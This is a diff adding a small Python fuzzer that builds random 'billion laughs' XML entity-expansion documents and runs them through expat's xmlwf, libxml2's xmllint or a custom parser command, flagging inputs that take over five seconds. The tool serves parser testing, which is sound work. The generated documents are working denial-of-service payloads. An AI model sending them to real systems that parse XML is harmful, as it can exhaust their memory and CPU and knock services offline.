@@ -1,0 +1,62 @@
+#!/usr/bin/env python3
+# SPDX-License-Identifier: 0BSD
+
+import argparse
+import os
+import pathlib
+import secrets
+import subprocess
+import sys
+import time
+
+
+def getrn():
+    return secrets.randbelow(5000) ** 3 // (1024 * 1024 * 64)
+
+
+ap = argparse.ArgumentParser()
+ap.add_argument("--mode", default="expat", help="One of expat (default), libxml, custom")
+ap.add_argument("--command", help="Command to use in 'custom' mode")
+ap.add_argument("--keep", action="store_true", help="Always keep files (even if not suspicious)")
+ap.add_argument("--runs", default=1, help="Number of runs")
+args = ap.parse_args()
+
+
+
+for i in range(int(args.runs)):
+    length = getrn()
+    multi = getrn()
+    depth = getrn()
+
+    lolstring = "l" * length
+    exploit = f'<!DOCTYPE billion [ <!ENTITY a0 "{lolstring}">\n'
+
+    for i in range(depth):
+        entities = f"&a{i};" * multi
+        exploit += f'<!ENTITY a{i + 1} "{entities}">\n'
+
+    exploit += f"]><x>&a{depth};</x>\n"
+
+    start = int(time.time())
+
+    fn = f"out/b{secrets.token_urlsafe(10)}.xml"
+    pathlib.Path(fn).write_text(exploit)
+
+    if args.mode == "expat":
+        cmd = ["xmlwf", fn]
+    elif args.mode == "libxml":
+        cmd = ["xmllint", "--noent", fn]
+    elif args.mode == "custom":
+        cmd = [*args.command.split(" "), fn]
+    else:
+        sys.exit("Invalid mode")
+
+    subprocess.run(cmd, check=False)
+
+    end = int(time.time())
+    duration = end - start
+
+    if duration > 5:
+        print(f"{cmd} took long ({duration}s) with {fn}, length={length}, multi={multi}, depth={depth}")
+    elif not args.keep:
+        os.remove(fn)
